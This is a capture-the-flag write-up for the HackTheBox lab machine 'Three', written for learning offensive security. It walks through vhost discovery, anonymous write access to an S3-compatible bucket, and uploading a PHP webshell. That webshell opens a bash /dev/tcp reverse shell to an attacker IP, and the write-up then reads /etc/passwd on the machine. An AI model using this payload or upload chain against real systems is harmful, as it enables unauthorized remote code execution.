# HackTheBox - Three

**OS:** Linux  
**Difficulty:** Very Easy  
**IP Address:** 10.129.227.248

---

# Overview

Three demonstrates how a cloud storage misconfiguration can lead to Remote Code Execution (RCE).

Instead of exploiting a software vulnerability, the attack abuses an insecure Amazon S3-compatible bucket that allows anonymous read and write access.

## Attack Chain

```
Nmap
    |
    v
HTTP Enumeration
    |
    v
Virtual Host Discovery
    |
    v
S3-Compatible Service
    |
    v
Anonymous Bucket Access
    |
    v
Bucket Enumeration
    |
    v
Anonymous File Upload
    |
    v
Website Uses Bucket
    |
    v
PHP Code Execution
    |
    v
Remote Code Execution
    |
    v
Reverse Shell
    |
    v
Linux Enumeration
    |
    v
Flag
```

---

# 1. Enumeration

## Initial Port Scan

```bash
sudo nmap -Pn -p- --min-rate 5000 -v 10.129.227.248
```

Result:

```
22/tcp open ssh
80/tcp open http
```

---

## Service Enumeration

```bash
nmap -Pn -sV -sC -p 22,80 10.129.227.248
```

Result:

```
22/tcp
OpenSSH 7.6p1

80/tcp
Apache 2.4.29

Host:
thetoppers.htb
```

Important discovery:

```
Host:
thetoppers.htb
```

Added into:

```
/etc/hosts
```

```
10.129.227.248 thetoppers.htb
```

---

# 2. Web Enumeration

Homepage looked like a normal static website.

No obvious:

- login page
- admin panel
- parameters

Performed directory enumeration.

```bash
gobuster dir \
-u http://thetoppers.htb \
-w /snap/seclists/current/Discovery/Web-Content/common.txt \
-x php,html,txt
```

Interesting results:

```
index.php
images/
server-status
```

No vulnerability found.

---

# 3. Virtual Host Enumeration

Since nothing interesting was found on the main website, virtual host enumeration was performed.

```bash
gobuster vhost \
-u http://thetoppers.htb \
-w /snap/seclists/current/Discovery/DNS/subdomains-top1million-5000.txt \
--append-domain
```

Discovery:

```
s3.thetoppers.htb
```

Added:

```
10.129.227.248 s3.thetoppers.htb
```

---

# 4. S3 Discovery

Checking the service:

```bash
curl -i http://s3.thetoppers.htb
```

Interesting headers:

```
x-amz-acl
x-amz-date
x-amz-version-id
```

These headers indicate an Amazon S3-compatible API.

---

# 5. AWS CLI

AWS CLI was used to communicate with the S3 service.

Anonymous access was required.

List buckets:

```bash
aws s3 ls \
--endpoint-url http://s3.thetoppers.htb \
--no-sign-request
```

Result:

```
thetoppers.htb
```

---

# 6. Bucket Enumeration

List bucket contents:

```bash
aws s3 ls s3://thetoppers.htb \
--endpoint-url http://s3.thetoppers.htb \
--no-sign-request
```

Result:

```
images/
index.php
.htaccess
```

Anonymous read access was enabled.

---

# 7. Anonymous Upload

Create test file:

```bash
echo "Hello HTB" > test.txt
```

Upload:

```bash
aws s3 cp test.txt s3://thetoppers.htb \
--endpoint-url http://s3.thetoppers.htb \
--no-sign-request
```

Upload succeeded.

Verify:

```
http://thetoppers.htb/test.txt
```

Output:

```
Hello HTB
```

This confirmed:

- Website files are served directly from the bucket.
- Anonymous upload is possible.

---

# 8. PHP Execution

Created:

```php
<?php
phpinfo();
?>
```

Saved as:

```
info.php
```

Uploaded:

```bash
aws s3 cp info.php s3://thetoppers.htb \
--endpoint-url http://s3.thetoppers.htb \
--no-sign-request
```

Opened:

```
http://thetoppers.htb/info.php
```

PHP executed successfully.

This confirmed:

```
Remote Code Execution (RCE)
```

---

# 9. Reverse Shell

Created:

```php
<?php
system("bash -c 'bash -i >& /dev/tcp/10.10.14.225/4444 0>&1'");
?>
```

Saved:

```
shell.php
```

Listener:

```bash
nc -lvnp 4444
```

Uploaded:

```bash
aws s3 cp shell.php s3://thetoppers.htb \
--endpoint-url http://s3.thetoppers.htb \
--no-sign-request
```

Executed:

```
http://thetoppers.htb/shell.php
```

Received shell:

```
www-data@three:/var/www/html$
```

---

# 10. Shell Upgrade

Spawn PTY:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Background shell:

```
CTRL+Z
```

Local terminal:

```bash
stty raw -echo
fg
```

Target:

```bash
export TERM=xterm
stty rows 40 columns 120
```

---

# 11. Linux Enumeration

Current user:

```bash
whoami
```

```
www-data
```

System:

```bash
uname -a
```

```
Ubuntu 18.04
```

Users:

```bash
cat /etc/passwd
```

Interesting user:

```
svc
```

Home directory:

```bash
ls /home
```

```
svc
```

---

# 12. Flag

Locate:

```bash
find / -name "flag.txt" 2>/dev/null
```

Result:

```
/var/www/flag.txt
```

Read:

```bash
cat /var/www/flag.txt
```

---

# Concepts Learned

## Web

- HTTP Enumeration
- Directory Enumeration
- Virtual Host Enumeration

---

## Cloud

### Amazon S3
Simple Storage Service

### Bucket
Container that stores objects.

### Object
Files stored inside a bucket.

### Endpoint
URL used to communicate with an API.

### AWS CLI
Official command-line interface for AWS services.

### Anonymous Access

Anonymous Read

Anonymous Write

---

## Linux

- Reverse Shell
- www-data user
- PTY Upgrade
- Linux Enumeration

---

# Attack Flow

```
Website
      |
      v
Virtual Host
      |
      v
S3-Compatible API
      |
      v
Bucket Enumeration
      |
      v
Anonymous Read
      |
      v
Anonymous Write
      |
      v
Upload PHP
      |
      v
PHP Execution
      |
      v
Remote Code Execution
      |
      v
Reverse Shell
      |
      v
Linux Access
      |
      v
Flag
```

---

# Tools Used

| Tool | Purpose |
|------|---------|
| Nmap | Port & service enumeration |
| Gobuster | Directory and virtual host discovery |
| Curl | HTTP inspection |
| AWS CLI | S3 bucket interaction |
| Netcat | Reverse shell listener |
| PHP | Remote code execution |
| Bash | Reverse shell |